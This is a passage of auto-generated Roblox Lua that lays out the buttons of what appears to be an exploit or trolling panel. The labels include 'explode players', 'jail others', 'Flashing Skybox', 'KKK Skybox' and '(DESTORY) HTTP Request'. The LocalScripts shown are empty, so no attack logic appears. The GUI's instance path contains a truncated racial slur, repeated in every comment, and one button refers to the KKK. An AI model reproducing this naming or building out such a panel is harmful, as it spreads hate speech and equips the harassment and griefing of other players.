G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextScaled"] = true;
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["Text"] = [[Neon Map]];
G2L["3e"]["Position"] = UDim2.new(0, 0, 0.38419, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["40"] = Instance.new("TextButton", G2L["3"]);
G2L["40"]["TextWrapped"] = true;
G2L["40"]["TextSize"] = 14;
G2L["40"]["TextScaled"] = true;
G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["Size"] = UDim2.new(0, 153, 0, 44);
G2L["40"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["Text"] = [[John Doe F3x]];
G2L["40"]["Position"] = UDim2.new(-0.00918, 0, 0.29666, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["42"] = Instance.new("TextButton", G2L["3"]);
G2L["42"]["TextWrapped"] = true;
G2L["42"]["TextSize"] = 14;
G2L["42"]["TextScaled"] = true;
G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["Size"] = UDim2.new(0, 153, 0, 40);
G2L["42"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["Text"] = [[Mr Bean Admin F3X]];
G2L["42"]["Position"] = UDim2.new(-0.00388, 0, 0.24933, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["43"] = Instance.new("LocalScript", G2L["42"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["44"] = Instance.new("TextButton", G2L["3"]);
G2L["44"]["TextWrapped"] = true;
G2L["44"]["TextSize"] = 14;
G2L["44"]["TextScaled"] = true;
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["Size"] = UDim2.new(0, 326, 0, 50);
G2L["44"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["Text"] = [[(DESTORY) HTTP Request]];
G2L["44"]["Position"] = UDim2.new(-0.0079, 0, 0.20157, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["45"] = Instance.new("LocalScript", G2L["44"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["46"] = Instance.new("TextButton", G2L["3"]);
G2L["46"]["TextWrapped"] = true;
G2L["46"]["TextSize"] = 14;
G2L["46"]["TextScaled"] = true;
G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["46"]["Size"] = UDim2.new(0, 153, 0, 41);
G2L["46"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["Text"] = [[K_aaX Roast]];
G2L["46"]["Position"] = UDim2.new(0.22378, 0, 0.42901, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["47"] = Instance.new("LocalScript", G2L["46"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["48"] = Instance.new("TextButton", G2L["3"]);
G2L["48"]["TextWrapped"] = true;
G2L["48"]["TextSize"] = 14;
G2L["48"]["TextScaled"] = true;
G2L["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["48"]["Size"] = UDim2.new(0, 153, 0, 43);
G2L["48"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["Text"] = [[Big Fire all]];
G2L["48"]["Position"] = UDim2.new(0.22378, 0, 0.46479, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["49"] = Instance.new("LocalScript", G2L["48"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["4a"] = Instance.new("TextButton", G2L["3"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["TextScaled"] = true;
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["Size"] = UDim2.new(0, 154, 0, 43);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["Text"] = [[Spin all]];
G2L["4a"]["Position"] = UDim2.new(0.43847, 0, 0.42856, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["4c"] = Instance.new("TextButton", G2L["3"]);
G2L["4c"]["TextWrapped"] = true;
G2L["4c"]["TextSize"] = 14;
G2L["4c"]["TextScaled"] = true;
G2L["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4c"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["Text"] = [[Skybox 2]];
G2L["4c"]["Position"] = UDim2.new(0.21849, 0, 0.69916, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["4d"] = Instance.new("LocalScript", G2L["4c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["4e"] = Instance.new("TextButton", G2L["3"]);
G2L["4e"]["TextWrapped"] = true;
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["TextScaled"] = true;
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["Text"] = [[fast all]];
G2L["4e"]["Position"] = UDim2.new(0.65292, 0, 0.3856, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["50"] = Instance.new("TextButton", G2L["3"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["TextSize"] = 14;
G2L["50"]["TextScaled"] = true;
G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["50"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["Text"] = [[loopwarp all]];
G2L["50"]["Position"] = UDim2.new(0.65027, 0, 0.49987, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["51"] = Instance.new("LocalScript", G2L["50"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["52"] = Instance.new("TextButton", G2L["3"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["TextSize"] = 14;
G2L["52"]["TextScaled"] = true;
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["52"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["52"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["Text"] = [[Smoke all]];
G2L["52"]["Position"] = UDim2.new(0.43835, 0, 0.49974, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["53"] = Instance.new("LocalScript", G2L["52"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["54"] = Instance.new("TextButton", G2L["3"]);
G2L["54"]["TextWrapped"] = true;
G2L["54"]["TextSize"] = 14;
G2L["54"]["TextScaled"] = true;
G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["54"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["54"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["Text"] = [[Chat all]];
G2L["54"]["Position"] = UDim2.new(0.22378, 0, 0.49987, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["54"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["56"] = Instance.new("TextButton", G2L["3"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["TextSize"] = 14;
G2L["56"]["TextScaled"] = true;
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["56"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["56"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["Text"] = [[Day]];
G2L["56"]["Position"] = UDim2.new(-0.00006, 0, 0.50832, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["57"] = Instance.new("LocalScript", G2L["56"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["58"] = Instance.new("TextButton", G2L["3"]);
G2L["58"]["TextWrapped"] = true;
G2L["58"]["TextSize"] = 14;
G2L["58"]["TextScaled"] = true;
G2L["58"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["58"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["58"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["Text"] = [[Night]];
G2L["58"]["Position"] = UDim2.new(-0.00006, 0, 0.54391, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["59"] = Instance.new("LocalScript", G2L["58"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["5a"] = Instance.new("TextButton", G2L["3"]);
G2L["5a"]["TextWrapped"] = true;
G2L["5a"]["TextSize"] = 14;
G2L["5a"]["TextScaled"] = true;
G2L["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5a"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["Text"] = [[Teams]];
G2L["5a"]["Position"] = UDim2.new(0.21849, 0, 0.54391, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["5b"] = Instance.new("LocalScript", G2L["5a"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["5c"] = Instance.new("TextButton", G2L["3"]);
G2L["5c"]["TextWrapped"] = true;
G2L["5c"]["TextSize"] = 14;
G2L["5c"]["TextScaled"] = true;
G2L["5c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5c"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["Text"] = [[Flashing Skybox (WARNING)]];
G2L["5c"]["Position"] = UDim2.new(0.43968, 0, 0.54508, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["5d"] = Instance.new("LocalScript", G2L["5c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["5e"] = Instance.new("TextButton", G2L["3"]);
G2L["5e"]["TextWrapped"] = true;
G2L["5e"]["TextSize"] = 14;
G2L["5e"]["TextScaled"] = true;
G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["Text"] = [[Blur others]];
G2L["5e"]["Position"] = UDim2.new(0.65292, 0, 0.54508, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["5f"] = Instance.new("LocalScript", G2L["5e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["60"] = Instance.new("TextButton", G2L["3"]);
G2L["60"]["TextWrapped"] = true;
G2L["60"]["TextSize"] = 14;
G2L["60"]["TextScaled"] = true;
G2L["60"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["60"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["60"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["Text"] = [[jail others]];
G2L["60"]["Position"] = UDim2.new(0.6516, 0, 0.5795, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["61"] = Instance.new("LocalScript", G2L["60"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["62"] = Instance.new("TextButton", G2L["3"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["TextSize"] = 14;
G2L["62"]["TextScaled"] = true;
G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["62"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["Text"] = [[explode players]];
G2L["62"]["Position"] = UDim2.new(0.43968, 0, 0.58008, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["63"] = Instance.new("LocalScript", G2L["62"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["64"] = Instance.new("TextButton", G2L["3"]);
G2L["64"]["TextWrapped"] = true;
G2L["64"]["TextSize"] = 14;
G2L["64"]["TextScaled"] = true;
G2L["64"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["Size"] = UDim2.new(0, 153, 0, 46);
G2L["64"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["Text"] = [[Message 1]];
G2L["64"]["Position"] = UDim2.new(0.22113, 0, 0.5817, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["65"] = Instance.new("LocalScript", G2L["64"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["66"] = Instance.new("TextButton", G2L["3"]);
G2L["66"]["TextWrapped"] = true;
G2L["66"]["TextSize"] = 14;
G2L["66"]["TextScaled"] = true;
G2L["66"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["66"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["66"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["Text"] = [[Message 2]];
G2L["66"]["Position"] = UDim2.new(-0.00006, 0, 0.58242, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["67"] = Instance.new("LocalScript", G2L["66"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["68"] = Instance.new("TextButton", G2L["3"]);
G2L["68"]["TextWrapped"] = true;
G2L["68"]["TextSize"] = 14;
G2L["68"]["TextScaled"] = true;
G2L["68"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["68"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["68"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["Text"] = [[Disc Hint]];
G2L["68"]["Position"] = UDim2.new(-0.00006, 0, 0.61392, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["69"] = Instance.new("LocalScript", G2L["68"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["6a"] = Instance.new("TextButton", G2L["3"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextScaled"] = true;
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Text"] = [[666 Skyify]];
G2L["6a"]["Position"] = UDim2.new(0.21849, 0, 0.61392, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["6b"] = Instance.new("LocalScript", G2L["6a"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["6c"] = Instance.new("TextButton", G2L["3"]);
G2L["6c"]["TextWrapped"] = true;
G2L["6c"]["TextSize"] = 14;
G2L["6c"]["TextScaled"] = true;
G2L["6c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6c"]["Size"] = UDim2.new(0, 153, 0, 43);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["Text"] = [[Alert]];
G2L["6c"]["Position"] = UDim2.new(0.43968, 0, 0.6156, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["6d"] = Instance.new("LocalScript", G2L["6c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["6e"] = Instance.new("TextButton", G2L["3"]);
G2L["6e"]["TextWrapped"] = true;
G2L["6e"]["TextSize"] = 14;
G2L["6e"]["TextScaled"] = true;
G2L["6e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6e"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["Text"] = [[Alert 2]];
G2L["6e"]["Position"] = UDim2.new(0.6516, 0, 0.61392, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["6f"] = Instance.new("LocalScript", G2L["6e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["70"] = Instance.new("TextButton", G2L["3"]);
G2L["70"]["TextWrapped"] = true;
G2L["70"]["TextSize"] = 14;
G2L["70"]["TextScaled"] = true;
G2L["70"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["70"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["70"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["Text"] = [[Title all 2]];
G2L["70"]["Position"] = UDim2.new(0.43968, 0, 0.65068, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["71"] = Instance.new("LocalScript", G2L["70"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["72"] = Instance.new("TextButton", G2L["3"]);
G2L["72"]["TextWrapped"] = true;
G2L["72"]["TextSize"] = 14;
G2L["72"]["TextScaled"] = true;
G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["72"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["Text"] = [[Big Smoke]];
G2L["72"]["Position"] = UDim2.new(0.21849, 0, 0.65126, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["73"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["74"] = Instance.new("TextButton", G2L["3"]);
G2L["74"]["TextWrapped"] = true;
G2L["74"]["TextSize"] = 14;
G2L["74"]["TextScaled"] = true;
G2L["74"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["74"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["74"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["Text"] = [[c00lify]];
G2L["74"]["Position"] = UDim2.new(-0.00006, 0, 0.65184, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["75"] = Instance.new("LocalScript", G2L["74"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["76"] = Instance.new("TextButton", G2L["3"]);
G2L["76"]["TextWrapped"] = true;
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextScaled"] = true;
G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["76"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["Text"] = [[k00pify]];
G2L["76"]["Position"] = UDim2.new(-0.00006, 0, 0.46524, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["77"] = Instance.new("LocalScript", G2L["76"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["78"] = Instance.new("TextButton", G2L["3"]);
G2L["78"]["TextWrapped"] = true;
G2L["78"]["TextSize"] = 14;
G2L["78"]["TextScaled"] = true;
G2L["78"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["78"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["Text"] = [[Title all 1]];
G2L["78"]["Position"] = UDim2.new(0.65292, 0, 0.65009, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["79"] = Instance.new("LocalScript", G2L["78"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["7a"] = Instance.new("TextButton", G2L["3"]);
G2L["7a"]["TextWrapped"] = true;
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextScaled"] = true;
G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7a"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["Text"] = [[g0re skybox]];
G2L["7a"]["Position"] = UDim2.new(0.43968, 0, 0.69865, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["7b"] = Instance.new("LocalScript", G2L["7a"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["7c"] = Instance.new("TextButton", G2L["3"]);
G2L["7c"]["TextWrapped"] = true;
G2L["7c"]["TextSize"] = 14;
G2L["7c"]["TextScaled"] = true;
G2L["7c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7c"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["Text"] = [[KKK Skybox]];
G2L["7c"]["Position"] = UDim2.new(0.65292, 0, 0.69865, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["7e"] = Instance.new("TextButton", G2L["3"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["TextSize"] = 14;
